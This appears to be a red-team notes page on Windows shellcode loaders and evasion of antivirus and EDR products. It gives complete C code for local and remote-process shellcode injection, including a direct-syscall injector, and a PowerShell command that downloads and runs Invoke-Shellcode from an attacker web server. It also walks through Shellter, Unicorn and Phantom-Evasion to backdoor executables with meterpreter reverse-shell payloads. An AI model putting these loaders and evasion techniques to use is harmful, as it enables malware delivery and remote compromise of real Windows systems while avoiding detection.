# Windows - Shellcode and PE loader

### Compilation

The basic `C` / `C++` code snippets in this note can be compiled on Linux using
the cross-compiler `mingw` or on Windows (recommended) using
`Developer Command Prompt` from `Visual Studio`:

```
# mingw.
# 32 bits
i686-w64-mingw32-gcc -lws2_32 -o <BINARY_NAME> <C_PROGRAM>
i686-w64-mingw32-g++ -lws2_32 -o <BINARY_NAME> <C_PROGRAM>
# 64 bits
x86_64-w64-mingw32-gcc -lws2_32 -o <BINARY_NAME> <C_PROGRAM>
x86_64-w64-mingw32-g++ -lws2_32 -o <BINARY_NAME> <C_PROGRAM>

# Visual Studio build tools.
cl <C_PROGRAM | CPP_PROGRAM>
```

Compiling on Windows is recommended for anti-virus evasion, as some products
may categorize `mingw` compilation artefacts.

### Basic shellcode loaders

###### [Windows] PowerShell Invoke-Shellcode

The `PowerShell` `PowerSploit`'s `Invoke-Shellcode` cmdlet can be leveraged to
execute directly in memory the shellcode through `IEX` `DownloadString`.

Depending on the system architecture, `Invoke-Shellcode` will either inject and
run the shellcode specified in the `$Shellcode32` or `$Shellcode64` variables.

```bash
# A web server hosting the modified Invoke-Shellcode script and a metasploit handler with the according payload type must be up and running

powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Force;
```

*As a compiled binary.*

The following `C` code can be used to compile a binary that will execute the
`PowerShell`'s `Invoke-Shellcode` cmdlet:

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
	system("powershell.exe -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http:///<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Force;");
	return 0;
}
```

###### [Windows] PowerShell - Unicorn

[`Magic Unicorn`](https://github.com/trustedsec/unicorn) is a tool for using a
PowerShell downgrade attack and inject shellcode (custom, `Cobalt Strike`
`beacon` or `Metasploit` `meterpreter`) straight into memory.

*Ensure Metasploit is installed if using Metasploit methods.*
If using `meterpreter` payloads the script will generate two files :
 - `PowerShell_attack.txt`
 - `unicorn.rc`

The text file contains all of the code needed in order to inject the
PowerShell attack into memory and the `rc` file can be used to start a
`Metasploit` reverse handler.

The commands are as follow:

```bash
python unicorn.py windows/meterpreter/reverse_http <HOST_IP> <HOST_PORT>

# On host.
msfconsole -r unicorn.rc

# On target.
# Execute the PowerShell command contained in the powershell_attack.txt file
```

###### [Windows] Basic C loader

*The shellcode loaders below (especially the remote one) are likely to be flag
by all `Endpoint detection and response` and behavioral anti-virus products.*

The `C` code below may be used as a template for running a shellcode in the
current process:

```c
#include "stdio.h"
#include "Windows.h"

int _tmain(int argc, TCHAR** argv) {
    // Hex encoded binary shellcode.
    // PoC example: msfvenom -a x64 -p windows/x64/exec CMD=calc.exe -f c
    unsigned char shellcode[] = "";

    // Allocate the memory section for the shellcode as PAGE_READWRITE (to avoid more detected PAGE_EXECUTE_READWRITE).
    LPVOID shellcodeBaseAddress = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_READWRITE);

    if (!shellcodeBaseAddress) {
        printf("Allocation of memory using VirtualAlloc failed: %x\n", GetLastError());
        return 1;
    }

    // Copy the shellcode in the newly allocated memory section.
    memcpy(shellcodeBaseAddress, shellcode, sizeof(shellcode));

    // Switch the protection of the shellcode's memory section to PAGE_EXECUTE_READ to execute the shellcode.
    DWORD OldProtectt = 0;
    BOOL virtualProctectStatus = VirtualProtect(shellcodeBaseAddress, sizeof(shellcode), PAGE_EXECUTE_READ, &OldProtectt);

    if (!virtualProctectStatus) {
        printf("Switching the protection of shellcode memory to PAGE_EXECUTE_READ using VirtualProtect failed: %x\n", GetLastError());
        return 1;
    }

    // Execute the shellcode by creating a new thread in the current process.
    SECURITY_ATTRIBUTES lpThreadAttributes = { 0 };
    HANDLE hThread = CreateThread(&lpThreadAttributes, 0, (LPTHREAD_START_ROUTINE) shellcodeBaseAddress, NULL, 0, NULL);

    if (!hThread) {
        printf("Thread execution using CreateThread failed: %x\n", GetLastError());
        return 1;
    }

    // Wait for the shellcode thread to finish execution.
    WaitForSingleObject(hThread, INFINITE);

    // Close the thread handle after use.
    CloseHandle(hThread);

    return 0;
}
```

The `C` code below may be used as a template for running a shellcode in a
remote process:

```c

#include "windows.h"
#include "Processthreadsapi.h"
#include "stdio.h"
#include "tchar.h"
#include "tlhelp32.h"

DWORD GetProcessId(const TCHAR* processName) {
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) {
        printf("Unable to acquire processes snapshot");
        return 0;
    }

    Process32First(processesSnapshot, &processInfo);

    if (!_tcscmp(processName, processInfo.szExeFile)) {
        CloseHandle(processesSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo)) {
        if (!_tcscmp(processName, processInfo.szExeFile)) {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);

    return 0;
}

int _tmain(int argc, TCHAR** argv) {

    // Hex encoded binary shellcode.
    unsigned char shellcode[] = "";
    size_t szShellcode = sizeof(shellcode);

    if (argc < 2) {
        printf("Usage: code.exe <TARGET_PROCESS_PID | TARGET_PROCESS_NAME>\n");
        return 1;
    }

    DWORD tpid = _tstoi(argv[1]);

    if (tpid == 0) {
        tpid = GetProcessId(argv[1]);
    }

    if (tpid == 0) {
        printf("Invalid PID or process name specified\n");
        return 1;
    }

    // Obtain an handle to the remote process.
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tpid);

    if (!hProc) {
        printf("Getting an handle on remote process using OpenProcess failed: %x\n", GetLastError());
        return 1;
    }

    // Allocate the memory section for the shellcode as PAGE_READWRITE (to avoid more detected PAGE_EXECUTE_READWRITE).
    LPVOID shellcodeBaseAddress = VirtualAllocEx(hProc, 0, szShellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);

    if (!shellcodeBaseAddress) {
        printf("Allocation of memory using VirtualAllocEx failed: %x\n", GetLastError());
        return 1;
    }

    // Copy the shellcode in the newly allocated memory section.
    BOOL WriteProcessMemoryStatus = WriteProcessMemory(hProc, shellcodeBaseAddress, shellcode, szShellcode, NULL);

    if (!WriteProcessMemoryStatus) {
        printf("Writing the shellcode memory to remote process using WriteProcessMemory failed: %x\n", GetLastError());
        return 1;
    }

    // Switch the protection of the shellcode's memory section to PAGE_EXECUTE_READ to execute the shellcode.
    DWORD OldProtectt = 0;
    BOOL virtualProctectExStatus = VirtualProtectEx(hProc, shellcodeBaseAddress, szShellcode, PAGE_EXECUTE_READ, &OldProtectt);

    if (!virtualProctectExStatus) {
        printf("Switching the protection of shellcode memory to PAGE_EXECUTE_READ using VirtualProtectEx failed: %x\n", GetLastError());
        return 1;
    }

    // Execute the shellcode by creating a new thread in the current process.
    SECURITY_ATTRIBUTES lpThreadAttributes = { 0 };
    HANDLE hThread = CreateRemoteThread(hProc, &lpThreadAttributes, 0, (LPTHREAD_START_ROUTINE) shellcodeBaseAddress, NULL, 0, NULL);

    if (!hThread) {
        printf("Thread execution using CreateRemoteThread failed: %x\n", GetLastError());
        return 1;
    }

    CloseHandle(hThread);
    CloseHandle(hProc);

    return 0;
}
```

### Shellcode loader for static analysis evasion

###### [Windows] Shellter

`Shellter` is a dynamic shellcode injection tool that can be used in order to
inject shellcode into native Windows applications (currently 32-bit
applications only for the free version). The shellcode can be self made or
generated within `Shellter` through a framework, such as Metasploit.

The following built-in shellcodes are currently supported:

```
Meterpreter_Reverse_TCP
Meterpreter_Reverse_HTTP
Meterpreter_Reverse_HTTPS
Meterpreter_Bind_TCP
Shell_Reverse_TCP
Shell_Bind_TCP
WinExec
```

The procedure to create a binary is as follow:

```
$ shellter.exe

Choose Operation Mode - Auto/Manual (A/M/H): A
Perform Online Version Check? (Y/N/H): N

PE Target: <BINARY_TO_INJECT_INTO>

[...]

# Check if the chosen binary match the OS version attacked
Minimum Supported Windows OS: 4.0

# Stealth Mode preserves the original functionality of the infected PE file, so "Stealth" refers to the human factor.
# If you just need a backdoor don't enable this feature.
Enable Stealth Mode? (Y/N/H): N

************
* Payloads *
************
[1] Meterpreter_Reverse_TCP   [stager]
[2] Meterpreter_Reverse_HTTP  [stager]
[3] Meterpreter_Reverse_HTTPS [stager]
[4] Meterpreter_Bind_TCP      [stager]
[5] Shell_Reverse_TCP         [stager]
[6] Shell_Bind_TCP            [stager]
[7] WinExec
# L: One of the above payload
# C: Custom shellcode, a file path must be provided
Use a listed payload or custom? (L/C/H): L
Select payload by index: 1

# Example for a Meterpreter payload.
***************************
* meterpreter_reverse_tcp *
***************************
SET LHOST: <HOSTNAME | IP>
SET LPORT: <HOSTPORT>
Payload: meterpreter_reverse_tcp

[...]

Injection: Verified!
Press [Enter] to continue...
```

### Shellcode loader for behavioral analysis evasion

###### Direct syscalls with SysWhispers

[`SysWhispers`](https://github.com/jthuraisamy/SysWhispers) is tool that can be
used to generate an `header` and `ASM` file to make directly `syscalls` in
supporting programming languages. `SysWhispers` supports `Windows XP` to
`Windows 10 21H1 (build 19043)` (as of the present note redaction date) using
`syscalls` numbers and prototypes
[referenced in the project repository](https://github.com/jthuraisamy/SysWhispers/blob/master/data).

The `syscall` version to use is determined at runtime directly in the assembly
implemented the `syscall` by retrieving the `OSMajorVersion` and
`OSMinorVersion` fields of the `Process Environment Block (PEB)` (through the
`Thread Information Block (TIB)`).

```bash
# Export the NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, and NtCreateThreadEx syscalls for all supported Windows versions.
syswhispers.py -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtProtectVirtualMemory,NtCreateThreadEx -o syscall_remote_inject

# Export all syscalls with compatibility for all supported Windows versions.
syswhispers.py --preset all -o syscalls_all
```

To add the produced to a `Visual Studio (2019)` project:

  - In the `Solution Explorer` -> Header File -> Add -> New Item... -> Header
	  File (.h) -> Add -> Copy the content the header file produced
	  by `SysWhispers`.

  - In the `Solution Explorer` -> Source File -> Add -> New Item... -> Utility
	  -> Text File (.txt) -> Rename the file extension in .asm -> Copy the
	  content the `ASM` file produced by `SysWhispers`.

  - In the `Solution Explorer`, right click on the project -> Build
	  Dependencies -> Build Customizations... -> Enable "masm(.targets, .props)".

  - Right click on the added `ASM` file -> Properties -> Item Type: Microsoft
	  Macro Assembler.

The following `C` code below can then be used to inject and run a shellcode in
a remote process directly using `syscalls`:

```c
#include "windows.h"
#include "Processthreadsapi.h"
#include "stdio.h"
#include "tchar.h"
#include "tlhelp32.h"

// Header file generated by SysWhispers that includes definition for NtAllocateVirtualMemory, NtWriteVirtualMemory, NtProtectVirtualMemory, and NtCreateThreadEx.
#include "SysWhispers.h"

// Returns the PID of the first process matching "processName".
DWORD GetProcessId(const TCHAR* processName) {
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) {
        printf("Unable to acquire processes snapshot");
        return 0;
    }

    Process32First(processesSnapshot, &processInfo);

    if (!_tcscmp(processName, processInfo.szExeFile)) {
        CloseHandle(processesSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo)) {
        if (!_tcscmp(processName, processInfo.szExeFile)) {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);

    return 0;
}

int _tmain(int argc, TCHAR** argv) {

    // Hex encoded binary shellcode.
    unsigned char shellcode[] = "";
    size_t szShellcode = sizeof(shellcode);

    if (argc < 2) {
        printf("Usage: code.exe <TARGET_PROCESS_PID | TARGET_PROCESS_NAME>\n");
        return 1;
    }

    DWORD tpid = _tstoi(argv[1]);

    if (tpid == 0) {
        tpid = GetProcessId(argv[1]);
    }

    if (tpid == 0) {
        printf("Invalid PID or process name specified\n");
        return 1;
    }

    // Obtain an handle to the remote process.
    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tpid);

    if (!hProc) {
        printf("Getting an handle on remote process using OpenProcess failed: %x\n", GetLastError());
        return 1;
    }

    // Allocate the memory section for the shellcode as PAGE_READWRITE (to avoid more detected PAGE_EXECUTE_READWRITE).
    LPVOID shellcodeBaseAddress = NULL;
    size_t szAllocated = szShellcode;
    NtAllocateVirtualMemory(hProc, &shellcodeBaseAddress, 0, (PSIZE_T) &szAllocated, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy the shellcode in the newly allocated memory section.
    NtWriteVirtualMemory(hProc, shellcodeBaseAddress, shellcode, szShellcode, 0);

    // Switch the protection of the shellcode's memory section to PAGE_EXECUTE_READ to execute the shellcode.
    DWORD oldprotect = 0;
    NtProtectVirtualMemory(hProc, &shellcodeBaseAddress, (PSIZE_T) &szAllocated, PAGE_EXECUTE_READ, &oldprotect);

    // Execute the shellcode by creating a new thread in the current process.
    HANDLE hThread = NULL;
    NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProc, shellcodeBaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

    CloseHandle(hProc);

    return 0;
}
```

###### DripLoader

[`DripLoader`](https://github.com/xinbailu/DripLoader) is a shellcode loader
that attempt to evade security products by:
  - Making direct `NtAllocateVirtualMemory` and `NtCreateThreadEx` syscalls
    (using an header and ASM files containing the syscalls' assembly
    instructions).

  - blending in legitimate memory allocations by only allocating
    `PageSizesized` (4kB by default) pages to place the shellcode in memory.

  - adding a delay between memory allocations to avoid multi-event correlation.

[`DripLoader-EmbedAES`](XXX) can be used to pack an `AES`-encrypted and
`base64`-encoded shellcode as resource file directly in a `DripLoader` binary.
If the `AES` key specified is partial, the missing bytes will be bruteforced.
This artificially added complexity may help evade security product's emulation
/ sandboxes based detections.

###### Donut

[`donut`](https://github.com/TheWover/donut)

TODO

###### ScareCrow

[`ScareCrow`](https://github.com/optiv/ScareCrow)

TODO

###### PEzor

[`PEzor`](https://github.com/phra/PEzor)

TODO

###### Phantom-Evasion (outdated)

`Phantom-Evasion 3.0` is a framework written in `Python` that can generate
both `x86` or `x64` executables and `DLL` / `Reflective DLL`.

`Phantom-Evasion 3.0` supports a number of Anti-virus evasion techniques,
execution and injection methods (thread, asynchronous procedure call, thread
execution hijack, etc.) with various memory allocation techniques, as well as
shellcode encryption.

Additionally, out of scope of the present note, `Phantom-Evasion 3.0` can be
used to generate Linux shellcode, backdoored Android APK, and offers various
Windows privileges escalation and persistence modules.

```bash
# With out any arguments, Phantom-Evasion is started in interactive mode
python3 phantom-evasion.py

-- General options
# -S, --strip / Strip executable
# -c <CERTSIGN>, --certsign <CERTSIGN> / Certificate spoofer and exe signer
# -cd <CERTDESCR>, --certdescr <CERTDESCR> /  Certificate description
# -E <EVASIONFREQUENCY>, --evasionfrequency EVASIONFREQUENCY /  Windows evasion code frequency (default:10)
# -J <JUNKFREQUENCY>, --junkfrequency <JUNKFREQUENCY> / Junkcode frequency (default:10)
# -j <JUNKINTENSITY>, --junkintensity <JUNKINTENSITY> / Junkcode intensity (default:10)
# -jr <JUNKREINJECT>, --junkreinject <JUNKREINJECT> / Junkcode reinjection intensity (default:10)
# -un, --unhook / Add Ntdll unhook routine
# -msq <MASQPATH>, --masqpath <MASQPATH> / Fake Process path for masquerading (default: C:\windows\system32\notepad.exe)
# -msqc <MASQCMD>, --masqcmd <MASQCMD> / Fake Fullcmdline for masquerading (default: empty)

-- Windows meterpreter stager
# MODULES:
#   windows/meterpreter/reverse_TCP = WRT
#   windows/meterpreter/reverse_http = WRH
#   windows/meterpreter/reverse_https = WRS

python3 phantom-evasion.py -a <x86 | x64> -m <WRT | WRH | WRS> -H <LISTENING_IP> -P <LISTENING_PORT> -f <exe | dll> -o <OUTPUT_FILENAME>
```

### Loaded Shellcode in-memory protection

###### In memory shellcode's contents encryption and memory protection switch (RW / NoAccess <-> RX)

*`Cobalt Strike`'s `sleepmask` kit.*

Refer to the `[Cobalt Strike] Beacons generation` note for more information on
possibilities natively offered by `Cobalt Strike` for in-memory obfuscation of
`beacons` shellcode.

*ShellcodeFluctuation.*

[`ShellcodeFluctuation`](https://github.com/mgeeky/ShellcodeFluctuation)

TODO

###### ThreadStackSpoofer

[`ThreadStackSpoofer`](https://github.com/mgeeky/ThreadStackSpoofer)

TODO

--------------------------------------------------------------------------------

### References

https://blog.redbluepurple.io/offensive-research/bypassing-injection-detection
